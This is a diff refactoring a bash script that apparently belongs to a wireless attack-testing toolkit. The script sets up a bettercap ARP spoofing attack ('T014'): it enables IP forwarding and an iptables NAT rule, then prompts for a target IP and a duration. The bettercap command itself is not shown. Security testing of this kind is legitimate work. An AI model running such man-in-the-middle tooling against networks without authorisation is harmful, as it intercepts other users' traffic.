@@ -23,11 +23,21 @@
 #   - Launches bettercap in non-interactive mode using an embedded command string
 #   - Cleans up on SIGINT or timeout using EXIT trap
 #   - Optionally disconnects from the network after attack ends
+#   - Forms the basis for T014
 
-# Load helpers
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-source "$SCRIPT_DIR/config.sh"
-source "$SCRIPT_DIR/print.sh"
+# ─── Paths ───
+BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+CONFIG_DIR="$BASH_DIR/config"
+HELPERS_DIR="$BASH_DIR/helpers"
+UTILITIES_DIR="$BASH_DIR/utilities"
+
+# ─── Configs ───
+source "$CONFIG_DIR/global.conf"
+source "$CONFIG_DIR/atk_bettercap_arp.conf"
+
+# ─── Helpers ───
+source "$HELPERS_DIR/fn_print.sh"
+source "$HELPERS_DIR/fn_mode.sh"
 
 # Check bettercap
 if ! command -v bettercap &> /dev/null; then
@@ -44,16 +54,11 @@ cleanup() {
     # Stop ARP spoofing & reset forwarding rules
     print_action "Disabling IP forwarding and removing NAT rule"
     sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null
-    sudo iptables -t nat -D POSTROUTING -o ens33 -j MASQUERADE
+    sudo iptables -t nat -D POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
     print_success "IP forwarding and NAT rule removed"
 
-    # Check mode
-    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
-    if [[ "$MODE" != "managed" ]]; then
-        print_action "Reverting to Managed mode"
-        bash "$SCRIPT_DIR/set-mode-managed.sh"
-        print_success "Interface set to Managed mode"
-    fi
+    # Revert mode
+    ensure_managed_mode
 
     exit 0   
 }
@@ -63,15 +68,15 @@ trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
-if [[ -z "$INTERFACE" || -z "$T014_TARGET_IP" ]]; then
-    print_warn "Required variables not defined in config.sh: INTERFACE or T014_TARGET_IP"
+if [[ -z "$INTERFACE" || -z "$ATK_TARGET_IP" ]]; then
+    print_warn "INTERFACE or ATK_TARGET_IP not defined in atk_bettercap_arp.conf"
     exit 0
 fi
 
 # Display config
 echo "Mode         : T014 - ARP Spoofing"
 echo "Interface    : $INTERFACE"
-echo "Target IP    : $T014_TARGET_IP"
+echo "Target IP    : $ATK_TARGET_IP"
 print_blank
 
 # Confirm attack
@@ -85,10 +90,10 @@ fi
 
 # Input duration
 while true; do
-    print_prompt "Duration (seconds) [default: ${ATTACK_DURATION}]: "
+    print_prompt "Duration (seconds) [default: ${ATK_DURATION}]: "
     read -r DURATION
 
-    DURATION="${DURATION:-$ATTACK_DURATION}"
+    DURATION="${DURATION:-$ATK_DURATION}"
     
     if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
         break
@@ -99,10 +104,10 @@ done
 
 # Input IP address
 while true; do
-    print_prompt "Target IP address [default: ${T014_TARGET_IP}]: "
+    print_prompt "Target IP address [default: ${ATK_TARGET_IP}]: "
     read -r TARGET_IP
 
-    TARGET_IP="${TARGET_IP:-$T014_TARGET_IP}"
+    TARGET_IP="${TARGET_IP:-$ATK_TARGET_IP}"
     
     if [[ "$TARGET_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
         break
@@ -125,18 +130,13 @@ echo "T014" > /tmp/watt_attack_active
 print_blank
 print_info "Starting Attack"
 
-# Check mode
-MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
-if [[ "$MODE" != "managed" ]]; then
-    print_action "Enabling Managed mode"
-    bash "$SCRIPT_DIR/set-mode-managed.sh"
-    print_success "Interface set to Managed mode"
-fi
+# Set managed mode
+ensure_managed_mode
 
 # Enabled IP forwarding and NAT
-print_action "Enabling IP forwarding and NAT on $INTERFACE → ens33"
+print_action "Enabling IP forwarding and NAT on $INTERFACE → $FWD_INTERFACE"
 sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
-sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
+sudo iptables -t nat -A POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
 print_success "IP forwarding and NAT rule added"
 
 # Run attack
